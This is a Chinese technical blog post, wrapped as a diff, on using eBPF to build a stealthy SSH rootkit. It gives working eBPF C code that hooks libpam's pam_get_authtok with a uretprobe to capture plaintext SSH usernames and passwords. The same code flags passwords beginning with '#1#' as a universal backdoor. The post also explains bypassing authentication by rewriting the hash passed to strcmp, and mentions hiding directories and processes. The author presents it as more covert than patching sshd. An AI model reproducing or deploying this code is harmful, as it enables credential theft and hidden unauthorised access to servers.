@@ -1,0 +1,169 @@
+#### 简介
+这段时间在研究eBPF在Linux上的应用，简要的记录下利用eBPF。
+​ BPF(Berkely Packet Filter)被设计用于抓取、过滤（特定规则的）数据包，Filters可以运行在基于寄存器的虚拟机中。
+​
+最迷人的地方在于，BPF可以将userSpace提供的程序运行在内核中而不需要重新编译内核或者加载内核模块。但是BPF受限于最初的设计：只有两个寄存器、指令集滞后于现代的64bits的处理器、以及多处理器需要的新的指令。因此Alexei
+Starovoit提出了eBPF(Extended BPF)解决这些问题。
+​ 简单地讲，eBPF提供了一种使得user space application可以在不需要加载内核模块的情况下运行在kernel
+mode的方式，同kernel module相比，eBPF更简单、稳定、安全。
+并且由于JIT的存在，使得eBPF的执行性能也更好。eBPF经常被用于：跟踪分析、插桩、hook、调试、数据包处理/过滤。
+#### 跟踪与插桩
+​ Linux的各种trace工具经常让我感到困惑，在[Linux-strace-System](https://jvns.ca/blog/2017/07/05/linux-tracing-systems/#ftrace)里将Linux
+trace机制分为三类：数据源、数据收集处理（来自数据源）、前端（用户交互）还是比较清晰合理的。
+数据源都是来自Linux Kernel，基本有三类：
+  * kprobe
+kprobe针对KernelSpace的函数，动态的插桩，可以在指定的函数执行前后执行任意代码。
+  * uprobe
+uprobe针对UserSpace的函数，动态的插桩，可以在指定的函数执行前后执行任意代码。
+  * tracepoint
+tracepoint是由Linux 内核维护的，静态插桩的代码，大部分系统调用的插桩是通过这种方式。
+基于这些数据源，可以构建很多前端的工具，例如sysdig, ftrace等。
+而eBPF可以支持上面所有数据源的收集与处理。
+基于这些，最近有相关的研究将eBPF技术应用在Rootkit上，例如Defcon
+并且有公开的项目可以学习[bad-bpf](https://github.com/pathtofile/bad-bpf).
+但是这些基本都集中在和rootkit一样的玩法（都是对系统调用做插桩），没有在UserSpace层做一些有意思的，本文主要通过eBPF实现SSH密码记录和万能密码后门。
+#### 隐藏目录
+​
+通过`tracepoint`静态的跟踪点，可以对`getdents64`插桩，实现隐藏指定目录，简介的也实现了隐藏指定的进程PID，这不是这篇文章的重点。
+#### SSH密码记录
+之所以想通过eBPF的方式实现一个SSH密码记录和后门登录的工具，主要是eBPF的特性，它可以在不修改原文件的情况下以动态插桩的方式完成一定的目的，同时支持UserSpace和KernelSpace的数据交互。
+较之patch sshd源码的方式，eBPF实现更具隐蔽性。
+uprobe原理上支持在进程的任意地址插桩，但是实际中出于兼容性，一般针对库文件的导出函数插桩比较方便（需要指定插桩地址在库文件的偏移），如果直接对ssh相关的文件插桩，兼容性难保证（去符号了，不同版本函数偏移有差异）。因此选了PAM库文件作为目标。
+在ssh的身份认证代码中，[auth-pam.c](https://github.com/openssh/openssh-portable/blob/7cc3fe28896e653956a6a2eed0a25d551b83a029/auth-pam.c)，如果`/etc/ssh/sshd_config`配置允许通过PAM认证，将调用`sshpam_auth_passwd`函数认证
+    /*
+     * Attempt password authentication via PAM
+     */
+    int
+    sshpam_auth_passwd(Authctxt *authctxt, const char *password)
+    {
+        ...
+        sshpam_err = pam_authenticate(sshpam_handle, flags);
+        sshpam_password = NULL;
+        free(fake);
+        if (sshpam_err == PAM_MAXTRIES)
+            sshpam_set_maxtries_reached(1);
+        if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+            debug("PAM: password authentication accepted for %.100s",
+                authctxt->user);
+            return 1;
+        } else {
+            debug("PAM: password authentication failed for %.100s: %s",
+                authctxt->valid ? authctxt->user : "an illegal user",
+                pam_strerror(sshpam_handle, sshpam_err));
+            return 0;
+        }
+    }
+`pam_authenticate`函数来自`libpam.so.0`导出函数
+    tree@tree-ubt:~/bpfRkt$ ldd `which sshd` | grep pam
+        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007f29edbc6000)
+分析libpam代码，`pam_authenticate`最终将调用`pam_sm_authenticate`。
+在libpam 下 [pam_unix_auth.c](https://github.com/linux-pam/linux-pam/blob/master/modules/pam_unix/pam_unix_auth.c)，
+    int
+    pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
+    {
+        ....
+        /* get this user's authentication token */
+        retval = pam_get_authtok(pamh, PAM_AUTHTOK, &p , NULL);
+        if (retval != PAM_SUCCESS) {
+            if (retval != PAM_CONV_AGAIN) {
+                pam_syslog(pamh, LOG_CRIT,
+                    "auth could not identify password for [%s]", name);
+            } else {
+                D(("conversation function is not ready yet"));
+                /*
+                 * it is safe to resume this function so we translate this
+                 * retval to the value that indicates we're happy to resume.
+                 */
+                retval = PAM_INCOMPLETE;
+            }
+            name = NULL;
+            AUTH_RETURN;
+        }
+        D(("user=%s, password=[%s]", name, p));
+    }
+这里比较有趣的是`pam_get_authtok`函数，在该函数执行完后，`passwd`将以明文的形式存在。
+而`pamh`参数中本就有`username`的明文，所以这是一个记录username:passwd的比较便利的位置。
+实现代码：
+    SEC("uretprobe/pam_get_authtok")
+    int post_pam_get_authtok(struct pt_regs* ctx)
+    {
+        char* passwd_ptr;
+        char* user_ptr;
+        static struct pam_handle *pamh = NULL;
+        int index, event_type = 0;
+        struct ssh_secret ssh;
+        pamh = PT_REGS_PARM1(ctx);
+        bpf_probe_read_user(&user_ptr, sizeof(user_ptr), &pamh->user);
+        if(user_ptr == NULL){
+            //bpf_printk("user_ptr is NULL: \n");
+            return 0;
+        }
+        bpf_probe_read_user_str(ssh.username, MAX_USERNAME_LEN,  user_ptr);
+        bpf_printk("post_pam_get_authtok username: %s\n", ssh.username);
+        bpf_probe_read_user(&passwd_ptr, sizeof(passwd_ptr), (void*)PT_REGS_PARM3(ctx));
+        if(passwd_ptr == NULL)
+        {
+            //bpf_printk("passwd_ptr is NULL \n");
+            return 0;
+        }
+        bpf_probe_read_user_str(ssh.password, MAX_PASSWORD_LEN, passwd_ptr);
+        bpf_printk("post_pam_get_authtok password: %s\n", ssh.password);
+        // translate ssh
+        index = 0;
+        if(ssh.password[0] == '#' && ssh.password[1] == '1' && ssh.password[2] == '#')
+        {
+            // unversal password
+            bpf_map_update_elem(&map_pass, &index, &ssh.password, BPF_ANY);
+            event_type = 4;
+        }
+        else{       
+            //record the username:password
+            bpf_map_update_elem(&map_ssh, &index, &ssh, BPF_ANY);
+            event_type = 3;
+        }
+        // ring event
+        struct event* e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+        if(e){
+            e->success = event_type;            // get ssh info
+            e->pid = 0;
+            bpf_get_current_comm(&e->comm, sizeof(e->comm));
+            bpf_ringbuf_submit(e, 0);
+        }
+        return 0;
+    }
+#### SSH万能密码
+虽然通过`uprobe`可以方便地读取UserSpace的内存，可以实现SSH用户名密码的窃取，但是想要实现留一个万能后门密码还是做不到的。
+目前`uprobe`只支持对UserSpace可写内存的读写，并不能够直接更改寄存器，换句话说我们无法直接通过修改`pam_authxxx`相关函数绕过认证。
+反复验证，尝试了通过栈寻址修改局部变量（存储返回值的变量），但是也没如愿。。（这些函数的返回值直接通过`[r]eax`寄存器控制）。如果想通过这种方式实现，需要找到一个pam认证函数，它的返回值是可以通过寻址定位的（动态分配的堆地址，栈空间）。
+最后，看到下面的验证密码hash的代码，想到一个迂回的办法
+    PAMH_ARG_DECL(int verify_pwd_hash,
+        const char *p, char *hash, unsigned int nullok)
+    {
+        ...
+            if (pp && strcmp(pp, hash) == 0) {  // modify pp to hash
+                retval = PAM_SUCCESS;
+            } else {
+                retval = PAM_AUTH_ERR;
+            }
+        return retval;      
+    }
+这里用的`strcmp`比较输入的密码的hash值和`/etc/shadow`文件里的哈希值。
+虽然通过`uprobe`通过没办法直接修改`strcmp`返回值，但是`strcmp`函数的返回值却可以间接地修改参数来控制。
+简言之，可以在`strcmp`调用前，修改错误的hash值和真实的hash值一致，自然就认证成功。
+效果：
+#### 最后
+​ 基本的功能达到了预期，但是eBPF的持久化还有一些问题，等搞定了再发下项目地址。（：
+#### 相关资料
+  * eBPF
+[syscall](https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html)
+[Linux-strace-System](https://jvns.ca/blog/2017/07/05/linux-tracing-systems/#ftrace)
+[LWN-Kprobes](https://lwn.net/Articles/132196/)
+[kprobes script](https://github.com/brendangregg/perf-tools/blob/master/kernel/kprobe)
+[linux-ftrace-uprobes](https://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html)
+[ebpf-rootkit
+1](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Guillaume%20Fournier%20Sylvain%20Afchain%20Sylvain%20Baubeau%20-%20eBPF%2C%20I%20thought%20we%20were%20friends.pdf)
+[bad-bpf](https://github.com/pathtofile/bad-bpf)
+  * SSH后门
+[openssh 源码分析权限维持](https://zhuanlan.zhihu.com/p/367003154)
+  * PAM后门
+[Linux Pam后门总结拓展](https://xz.aliyun.com/t/7902)
